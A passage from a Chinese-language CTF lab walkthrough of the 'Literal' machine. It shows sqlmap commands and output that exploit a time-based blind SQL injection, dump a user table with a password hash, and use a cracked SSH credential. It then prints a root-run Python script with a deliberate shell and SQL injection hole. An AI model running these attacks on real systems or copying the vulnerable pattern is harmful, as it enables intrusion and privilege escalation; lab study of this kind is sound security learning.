<span class="token punctuation">[</span><span class="token number">12</span>:50:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'PostgreSQL AND error-based - WHERE or HAVING clause'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:50:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:50:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'Oracle AND error-based - WHERE or HAVING clause (XMLType)'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:50:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'Generic inline queries'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:50:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'PostgreSQL > 8.1 stacked queries (comment)'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:50:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'Microsoft SQL Server/Sybase stacked queries (comment)'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:50:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:50:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:50:33<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> GET parameter <span class="token string">'category_id'</span> appears to be <span class="token string">'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'</span> injectable 
it looks like the back-end DBMS is <span class="token string">'MySQL'</span><span class="token builtin class-name">.</span> Do you want to skip <span class="token builtin class-name">test</span> payloads specific <span class="token keyword">for</span> other DBMSes? <span class="token punctuation">[</span>Y/n<span class="token punctuation">]</span> Y
<span class="token keyword">for</span> the remaining tests, <span class="token keyword">do</span> you want to include all tests <span class="token keyword">for</span> <span class="token string">'MySQL'</span> extending provided level <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> and risk <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> values? <span class="token punctuation">[</span>Y/n<span class="token punctuation">]</span> Y
<span class="token punctuation">[</span><span class="token number">12</span>:50:33<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'Generic UNION query (NULL) - 1 to 20 columns'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:50:33<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> automatically extending ranges <span class="token keyword">for</span> UNION query injection technique tests as there is at least one other <span class="token punctuation">(</span>potential<span class="token punctuation">)</span> technique found
<span class="token punctuation">[</span><span class="token number">12</span>:50:33<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> <span class="token string">'ORDER BY'</span> technique appears to be usable. This should reduce the <span class="token function">time</span> needed to <span class="token function">find</span> the right number of query columns. Automatically extending the range <span class="token keyword">for</span> current UNION query injection technique <span class="token builtin class-name">test</span>
<span class="token punctuation">[</span><span class="token number">12</span>:50:33<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> target URL appears to have <span class="token number">1</span> <span class="token function">column</span> <span class="token keyword">in</span> query
<span class="token keyword">do</span> you want to <span class="token punctuation">(</span>re<span class="token punctuation">)</span>try to <span class="token function">find</span> proper UNION <span class="token function">column</span> types with fuzzy test? <span class="token punctuation">[</span>y/N<span class="token punctuation">]</span> N
<span class="token punctuation">[</span><span class="token number">12</span>:50:33<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> <span class="token keyword">if</span> UNION based SQL injection is not detected, please consider and/or try to force the back-end DBMS <span class="token punctuation">(</span>e.g. <span class="token string">'--dbms=mysql'</span><span class="token punctuation">)</span> 
<span class="token punctuation">[</span><span class="token number">12</span>:50:33<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> target URL appears to be UNION injectable with <span class="token number">1</span> columns
<span class="token punctuation">[</span><span class="token number">12</span>:50:33<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> checking <span class="token keyword">if</span> the injection point on GET parameter <span class="token string">'category_id'</span> is a <span class="token boolean">false</span> positive
GET parameter <span class="token string">'category_id'</span> is vulnerable. Do you want to keep testing the others <span class="token punctuation">(</span>if any<span class="token punctuation">)</span>? <span class="token punctuation">[</span>y/N<span class="token punctuation">]</span> N
sqlmap identified the following injection point<span class="token punctuation">(</span>s<span class="token punctuation">)</span> with a total of <span class="token number">94</span> HTTP<span class="token punctuation">(</span>s<span class="token punctuation">)</span> requests:
---
Parameter: category_id <span class="token punctuation">(</span>GET<span class="token punctuation">)</span>
    Type: time-based blind
    Title: MySQL <span class="token operator">>=</span> <span class="token number">5.0</span>.12 AND time-based blind <span class="token punctuation">(</span>query SLEEP<span class="token punctuation">)</span>
    Payload: <span class="token assign-left variable">category_id</span><span class="token operator">=</span><span class="token number">2</span> AND <span class="token punctuation">(</span>SELECT <span class="token number">8612</span> FROM <span class="token punctuation">(</span>SELECT<span class="token punctuation">(</span>SLEEP<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">))</span><span class="token punctuation">)</span>vKOY<span class="token punctuation">)</span>
---
<span class="token punctuation">[</span><span class="token number">12</span>:51:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> the back-end DBMS is MySQL
<span class="token punctuation">[</span><span class="token number">12</span>:51:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
web server operating system: Linux Ubuntu <span class="token number">20.04</span> or <span class="token number">19.10</span> or <span class="token number">20.10</span> <span class="token punctuation">(</span>eoan or focal<span class="token punctuation">)</span>
web application technology: PHP, Apache <span class="token number">2.4</span>.41
back-end DBMS: MySQL <span class="token operator">>=</span> <span class="token number">5.0</span>.12
<span class="token punctuation">[</span><span class="token number">12</span>:51:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> HTTP error codes detected during run:
<span class="token number">500</span> <span class="token punctuation">(</span>Internal Server Error<span class="token punctuation">)</span> - <span class="token number">72</span> <span class="token builtin class-name">times</span>
<span class="token punctuation">[</span><span class="token number">12</span>:51:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetched data logged to text files under <span class="token string">'/root/.local/share/sqlmap/output/forumtesting.literal.hmv'</span>

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ending @ <span class="token number">12</span>:51:13 /2024-06-23/</code></pre>
<p>发现存在时间盲注，哥们，我赶着去复习呢，你给我时间盲注也太搞了</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> sqlmap <span class="token parameter variable">--url</span> http://forumtesting.literal.hmv/category.php<span class="token punctuation">\</span>?category_id<span class="token punctuation">\</span><span class="token operator">=</span><span class="token number">2</span> <span class="token parameter variable">--batch</span> <span class="token parameter variable">--dbs</span>
        ___
       __H__                                                                                                                                                                                                                                
 ___ ___<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">]</span>_____ ___ ___  <span class="token punctuation">&#123;</span><span class="token number">1.8</span>.2<span class="token comment">#stable&#125;                                                                                                                                                                                                    </span>
<span class="token operator">|</span>_ -<span class="token operator">|</span> <span class="token builtin class-name">.</span> <span class="token punctuation">[</span><span class="token punctuation">)</span><span class="token punctuation">]</span>     <span class="token operator">|</span> <span class="token builtin class-name">.</span><span class="token string">'| . |                                                                                                                                                                                                                   
|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible <span class="token keyword">for</span> any misuse or damage caused by this program

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> starting @ <span class="token number">12</span>:51:47 /2024-06-23/

<span class="token punctuation">[</span><span class="token number">12</span>:51:47<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> resuming back-end DBMS <span class="token string">'mysql'</span> 
<span class="token punctuation">[</span><span class="token number">12</span>:51:47<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing connection to the target URL
you have not declared cookie<span class="token punctuation">(</span>s<span class="token punctuation">)</span>, <span class="token keyword">while</span> server wants to <span class="token builtin class-name">set</span> its own <span class="token punctuation">(</span><span class="token string">'PHPSESSID=0o1o6isch7h...q54adnroq4'</span><span class="token punctuation">)</span>. Do you want to use those <span class="token punctuation">[</span>Y/n<span class="token punctuation">]</span> Y
sqlmap resumed the following injection point<span class="token punctuation">(</span>s<span class="token punctuation">)</span> from stored session:
---
Parameter: category_id <span class="token punctuation">(</span>GET<span class="token punctuation">)</span>
    Type: time-based blind
    Title: MySQL <span class="token operator">>=</span> <span class="token number">5.0</span>.12 AND time-based blind <span class="token punctuation">(</span>query SLEEP<span class="token punctuation">)</span>
    Payload: <span class="token assign-left variable">category_id</span><span class="token operator">=</span><span class="token number">2</span> AND <span class="token punctuation">(</span>SELECT <span class="token number">8612</span> FROM <span class="token punctuation">(</span>SELECT<span class="token punctuation">(</span>SLEEP<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">))</span><span class="token punctuation">)</span>vKOY<span class="token punctuation">)</span>
---
<span class="token punctuation">[</span><span class="token number">12</span>:51:47<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> the back-end DBMS is MySQL
web server operating system: Linux Ubuntu <span class="token number">20.10</span> or <span class="token number">19.10</span> or <span class="token number">20.04</span> <span class="token punctuation">(</span>focal or eoan<span class="token punctuation">)</span>
web application technology: PHP, Apache <span class="token number">2.4</span>.41
back-end DBMS: MySQL <span class="token operator">>=</span> <span class="token number">5.0</span>.12
<span class="token punctuation">[</span><span class="token number">12</span>:51:47<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetching database names
<span class="token punctuation">[</span><span class="token number">12</span>:51:47<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetching number of databases
<span class="token punctuation">[</span><span class="token number">12</span>:51:47<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> time-based comparison requires larger statistical model, please wait<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span> <span class="token punctuation">(</span>done<span class="token punctuation">)</span>                                                                                                             
<span class="token punctuation">[</span><span class="token number">12</span>:51:47<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
<span class="token keyword">do</span> you want sqlmap to try to optimize value<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">for</span> DBMS delay responses <span class="token punctuation">(</span>option <span class="token string">'--time-sec'</span><span class="token punctuation">)</span>? <span class="token punctuation">[</span>Y/n<span class="token punctuation">]</span> Y
<span class="token punctuation">[</span><span class="token number">12</span>:52:18<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> adjusting <span class="token function">time</span> delay to <span class="token number">1</span> second due to good response <span class="token builtin class-name">times</span>
<span class="token number">3</span>
<span class="token punctuation">[</span><span class="token number">12</span>:52:18<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> retrieved: information_schema
<span class="token punctuation">[</span><span class="token number">12</span>:54:12<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> retrieved: performance_schema
<span class="token punctuation">[</span><span class="token number">12</span>:56:03<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> retrieved: forumtesting
available databases <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>:
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> forumtesting
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> information_schema
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> performance_schema

<span class="token punctuation">[</span><span class="token number">12</span>:57:21<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetched data logged to text files under <span class="token string">'/root/.local/share/sqlmap/output/forumtesting.literal.hmv'</span>

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ending @ <span class="token number">12</span>:57:21 /2024-06-23/</code></pre>
<p>赶时间，我就抄了一下别人的表名</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://forumtesting.literal.hmv/category.php?category_id=2"</span>  <span class="token parameter variable">-D</span> forumtesting <span class="token parameter variable">-T</span> forum_owner <span class="token parameter variable">--dump</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://forumtesting.literal.hmv/category.php?category_id=2"</span>  <span class="token parameter variable">-D</span> forumtesting <span class="token parameter variable">-T</span> forum_owner <span class="token parameter variable">--dump</span> <span class="token parameter variable">--batch</span>
        ___
       __H__                                                                                                                                                                                                                                
 ___ ___<span class="token punctuation">[</span><span class="token string">']_____ ___ ___  &#123;1.8.2#stable&#125;                                                                                                                                                                                                    
|_ -| . [,]     | .'</span><span class="token operator">|</span> <span class="token builtin class-name">.</span> <span class="token operator">|</span>                                                                                                                                                                                                                   
<span class="token operator">|</span>___<span class="token operator">|</span>_  <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">]</span>_<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span>__,<span class="token operator">|</span>  _<span class="token operator">|</span>                                                                                                                                                                                                                   
      <span class="token operator">|</span>_<span class="token operator">|</span>V<span class="token punctuation">..</span>.       <span class="token operator">|</span>_<span class="token operator">|</span>   https://sqlmap.org                                                                                                                                                                                                

<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> legal disclaimer: Usage of sqlmap <span class="token keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="token string">'s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:58:18 /2024-06-23/

[12:58:18] [INFO] resuming back-end DBMS '</span>mysql<span class="token string">' 
[12:58:18] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('</span>PHPSESSID<span class="token operator">=</span>ks9s8snf7es<span class="token punctuation">..</span>.ogl78q5fij<span class="token string">'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: category_id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: category_id=2 AND (SELECT 8612 FROM (SELECT(SLEEP(5)))vKOY)
---
[12:58:18] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 20.10 or 19.10 (eoan or focal)
web application technology: Apache 2.4.41, PHP
back-end DBMS: MySQL >= 5.0.12
[12:58:18] [INFO] fetching columns for table '</span>forum_owner<span class="token string">' in database '</span>forumtesting<span class="token string">'
[12:58:18] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                                                                             
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '</span>--time-sec<span class="token string">')? [Y/n] Y
[12:58:28] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
5
[12:58:38] [INFO] retrieved: 
[12:58:48] [INFO] adjusting time delay to 1 second due to good response times
id
[12:58:58] [INFO] retrieved: username
[12:59:43] [INFO] retrieved: email
[13:00:09] [INFO] retrieved: password
[13:01:03] [INFO] retrieved: created
[13:01:40] [INFO] fetching entries for table '</span>forum_owner<span class="token string">' in database '</span>forumtesting<span class="token string">'
[13:01:40] [INFO] fetching number of entries for table '</span>forum_owner<span class="token string">' in database '</span>forumtesting<span class="token string">'
[13:01:40] [INFO] retrieved: 1
[13:01:42] [WARNING] reflective value(s) found and filtering out of statistical model, please wait                                                                                                                                         
.............................. (done)
2022-02-12
[13:02:40] [INFO] retrieved: carlos@forumtesting.literal.htb
[13:06:06] [INFO] retrieved: 1
[13:06:10] [INFO] retrieved: 6705fe62010679f04257358241792b41acba4ea896178a40eb63c743f5317a09faefa2e056486d55e9c05f851b222e6e7c5c1bd22af135157aa9b02201cf4e99
[13:20:03] [INFO] retrieved: carlos
[13:20:40] [INFO] recognized possible password hashes in column '</span>password<span class="token string">'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[13:20:40] [INFO] using hash method '</span>sha512_generic_passwd<span class="token string">'
what dictionary do you want to use?
[1] default dictionary file '</span>/usr/share/sqlmap/data/txt/wordlist.tx_<span class="token string">' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[13:20:40] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[13:20:40] [INFO] starting dictionary-based cracking (sha512_generic_passwd)
[13:20:40] [WARNING] multiprocessing hash cracking is currently not supported on this platform
[13:20:53] [WARNING] no clear password(s) found                                                                                                                                                                                            
Database: forumtesting
Table: forum_owner
[1 entry]
+----+---------------------------------+------------+----------------------------------------------------------------------------------------------------------------------------------+----------+
| id | email                           | created    | password                                                                                                                         | username |
+----+---------------------------------+------------+----------------------------------------------------------------------------------------------------------------------------------+----------+
| 1  | carlos@forumtesting.literal.htb | 2022-02-12 | 6705fe62010679f04257358241792b41acba4ea896178a40eb63c743f5317a09faefa2e056486d55e9c05f851b222e6e7c5c1bd22af135157aa9b02201cf4e99 | carlos   |
+----+---------------------------------+------------+----------------------------------------------------------------------------------------------------------------------------------+----------+

[13:20:53] [INFO] table '</span>forumtesting.forum_owner<span class="token string">' dumped to CSV file '</span>/root/.local/share/sqlmap/output/forumtesting.literal.hmv/dump/forumtesting/forum_owner.csv<span class="token string">'
[13:20:53] [INFO] fetched data logged to text files under '</span>/root/.local/share/sqlmap/output/forumtesting.literal.hmv'

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ending @ <span class="token number">13</span>:20:53 /2024-06-23/
</code></pre>
<p>也是跑出来了，虽迟但到。<br>碰撞一下密码<br><img src="https://ooo.0x0.ooo/2024/06/23/OPzd9b.png" alt="OPzd9b.png" loading="lazy"><br><code>carlos:forum100889</code></p>
<h2 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">ssh</span> carlos@192.168.56.189                      
carlos@192.168.56.189<span class="token string">'s password: 
Permission denied, please try again.
carlos@192.168.56.189'</span>s password: 
Permission denied, please try again.
carlos@192.168.56.189's password: </code></pre>
<p>不是哥们，还连不上去，看了别人的wp，发现forum是个论坛，那么ssh对应的密码是<code>ssh100889</code>，无语<br>拿到user shell也拿到了user flag</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">carlos@literal:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">44</span>
drwxr-xr-x <span class="token number">7</span> carlos carlos <span class="token number">4096</span> Apr  <span class="token number">8</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">3</span> root   root   <span class="token number">4096</span> Jun <span class="token number">15</span>  <span class="token number">2022</span> <span class="token punctuation">..</span>
lrwxrwxrwx <span class="token number">1</span> root   root      <span class="token number">9</span> Feb <span class="token number">12</span>  <span class="token number">2021</span> .bash_history -<span class="token operator">></span> /dev/null
-rw-r--r-- <span class="token number">1</span> carlos carlos  <span class="token number">220</span> Feb <span class="token number">25</span>  <span class="token number">2020</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> carlos carlos <span class="token number">3771</span> Feb <span class="token number">25</span>  <span class="token number">2020</span> .bashrc
drwx------ <span class="token number">2</span> carlos carlos <span class="token number">4096</span> Jun <span class="token number">21</span>  <span class="token number">2022</span> .cache
drwx------ <span class="token number">3</span> carlos carlos <span class="token number">4096</span> Jun <span class="token number">22</span>  <span class="token number">2022</span> .gnupg
drwxrwxr-x <span class="token number">3</span> carlos carlos <span class="token number">4096</span> Feb <span class="token number">12</span>  <span class="token number">2021</span> .local
drwxrwxr-x <span class="token number">2</span> carlos carlos <span class="token number">4096</span> Jun <span class="token number">21</span>  <span class="token number">2022</span> my_things
-rw-r--r-- <span class="token number">1</span> carlos carlos  <span class="token number">807</span> Feb <span class="token number">25</span>  <span class="token number">2020</span> .profile
drwx------ <span class="token number">2</span> carlos carlos <span class="token number">4096</span> Sep <span class="token number">20</span>  <span class="token number">2021</span> .ssh
-rw-r----- <span class="token number">1</span> root   carlos   <span class="token number">33</span> Feb <span class="token number">13</span>  <span class="token number">2021</span> user.txt
carlos@literal:~$ <span class="token function">cat</span> user.txt 
6d3c8a6c73cf4f89eea7ae57f6eb9222</code></pre>

<h2 id="提权root"><a href="#提权root" class="headerlink" title="提权root"></a>提权root</h2><p>sudo起手</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">carlos@literal:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> carlos on literal:
    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin<span class="token punctuation">\</span>:/snap/bin

User carlos may run the following commands on literal:
    <span class="token punctuation">(</span>root<span class="token punctuation">)</span> NOPASSWD: /opt/my_things/blog/update_project_status.py *</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">carlos@literal:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span> /opt/my_things/blog/update_project_status.py
-rwxr-xr-x <span class="token number">1</span> root root <span class="token number">3041</span> Jun <span class="token number">21</span>  <span class="token number">2022</span> /opt/my_things/blog/update_project_status.py
carlos@literal:~$ <span class="token function">cat</span> /opt/my_things/blog/update_project_status.py
<span class="token comment">#!/usr/bin/python3</span>

<span class="token comment"># Learning python3 to update my project status</span>
<span class="token comment">## (mental note: This is important, so administrator is my safe to avoid upgrading records by mistake) :P</span>

<span class="token string">''</span>'
References:
* MySQL commands <span class="token keyword">in</span> Linux: https://www.shellhacks.com/mysql-run-query-bash-script-linux-command-line/
* Shell commands <span class="token keyword">in</span> Python: https://stackabuse.com/executing-shell-commands-with-python/
* Functions: https://www.tutorialspoint.com/python3/python_functions.htm
* Arguments: https://www.knowledgehut.com/blog/programming/sys-argv-python-examples
* Array validation: https://stackoverflow.com/questions/7571635/fastest-way-to-check-if-a-value-exists-in-a-list
* Valid <span class="token keyword">if</span> root is running the script: https://stackoverflow.com/questions/2806897/what-is-the-best-way-for-checking-if-the-user-of-a-script-has-root-like-privileg
<span class="token string">''</span>'

<span class="token function">import</span> os
<span class="token function">import</span> sys
from datetime <span class="token function">import</span> <span class="token function">date</span>

<span class="token comment"># Functions ------------------------------------------------.</span>
def execute_query<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>:
    os.system<span class="token punctuation">(</span><span class="token string">"mysql -u "</span> + db_user + <span class="token string">" -D "</span> + db_name + <span class="token string">" -e <span class="token entity" title="\&quot;">\"</span>"</span> + sql + <span class="token string">"<span class="token entity" title="\&quot;">\"</span>"</span><span class="token punctuation">)</span>

<span class="token comment"># Query all rows</span>
def query_all<span class="token punctuation">(</span><span class="token punctuation">)</span>:
    sql <span class="token operator">=</span> <span class="token string">"SELECT * FROM projects;"</span>
    execute_query<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>

<span class="token comment"># Query row by ID</span>
def query_by_id<span class="token punctuation">(</span>arg_project_id<span class="token punctuation">)</span>:
    sql <span class="token operator">=</span> <span class="token string">"SELECT * FROM projects WHERE proid = "</span> + arg_project_id + <span class="token string">";"</span>
    execute_query<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>

<span class="token comment"># Update database</span>
def update_status<span class="token punctuation">(</span>enddate, arg_project_id, arg_project_status<span class="token punctuation">)</span>:
    <span class="token keyword">if</span> enddate <span class="token operator">!=</span> <span class="token number">0</span>:
        sql <span class="token operator">=</span> f<span class="token string">"UPDATE projects SET prodateend = '"</span> + str<span class="token punctuation">(</span>enddate<span class="token punctuation">)</span> + <span class="token string">"', prostatus = '"</span> + arg_project_status + <span class="token string">"' WHERE proid = '"</span> + arg_project_id + <span class="token string">"';"</span>
    else:
        sql <span class="token operator">=</span> f<span class="token string">"UPDATE projects SET prodateend = '2222-12-12', prostatus = '"</span> + arg_project_status + <span class="token string">"' WHERE proid = '"</span> + arg_project_id + <span class="token string">"';"</span>

    execute_query<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>

<span class="token comment"># Main program</span>
def main<span class="token punctuation">(</span><span class="token punctuation">)</span>:
    <span class="token comment"># Fast validation</span>
    try:
        arg_project_id <span class="token operator">=</span> sys.argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    except:
        arg_project_id <span class="token operator">=</span> <span class="token string">""</span>

    try:
        arg_project_status <span class="token operator">=</span> sys.argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
    except:
        arg_project_status <span class="token operator">=</span> <span class="token string">""</span>

    <span class="token keyword">if</span> arg_project_id and arg_project_status: <span class="token comment"># To update</span>
        <span class="token comment"># Avoid update by error</span>
        <span class="token keyword">if</span> os.geteuid<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span>:
            array_status <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"Done"</span>, <span class="token string">"Doing"</span>, <span class="token string">"To do"</span><span class="token punctuation">]</span>
            <span class="token keyword">if</span> arg_project_status <span class="token keyword">in</span> array_status:
                print<span class="token punctuation">(</span><span class="token string">"[+] Before update project ("</span> + arg_project_id + <span class="token string">")<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span>
                query_by_id<span class="token punctuation">(</span>arg_project_id<span class="token punctuation">)</span>

                <span class="token keyword">if</span> arg_project_status <span class="token operator">==</span> <span class="token string">'Done'</span><span class="token builtin class-name">:</span>
                    update_status<span class="token punctuation">(</span>date.today<span class="token punctuation">(</span><span class="token punctuation">)</span>, arg_project_id, arg_project_status<span class="token punctuation">)</span>
                else:
                    update_status<span class="token punctuation">(</span><span class="token number">0</span>, arg_project_id, arg_project_status<span class="token punctuation">)</span>
            else:
                print<span class="token punctuation">(</span><span class="token string">"Bro, avoid a fail: Done - Doing - To do"</span><span class="token punctuation">)</span>
                exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

            print<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\n">\n</span>[+] New status of project ("</span> + arg_project_id + <span class="token string">")<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span>
            query_by_id<span class="token punctuation">(</span>arg_project_id<span class="token punctuation">)</span>
        else:
            print<span class="token punctuation">(</span><span class="token string">"Ejejeeey, avoid mistakes!"</span><span class="token punctuation">)</span>
            exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

    <span class="token keyword">elif</span> arg_project_id:
        query_by_id<span class="token punctuation">(</span>arg_project_id<span class="token punctuation">)</span>
    else:
        query_all<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># Variables ------------------------------------------------.</span>
db_user <span class="token operator">=</span> <span class="token string">"carlos"</span>
db_name <span class="token operator">=</span> <span class="token string">"blog"</span>

<span class="token comment"># Main program</span>
main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>注意到</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">try:
       arg_project_id <span class="token operator">=</span> sys.argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
   except:
       arg_project_id <span class="token operator">=</span> <span class="token string">""</span>

   try:
       arg_project_status <span class="token operator">=</span> sys.argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
   except:
       arg_project_status <span class="token operator">=</span> <span class="token string">""</span></code></pre>
<p>脚本会接受两个参数，第一个参数会在下面地方执行，也就是会在sql里面执行</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">def query_by_id<span class="token punctuation">(</span>arg_project_id<span class="token punctuation">)</span>:
    sql <span class="token operator">=</span> <span class="token string">"SELECT * FROM projects WHERE proid = "</span> + arg_project_id + <span class="token string">";"</span>
    execute_query<span class="token punctuation">(</span>sql<span class="token punctuation">)</span></code></pre>
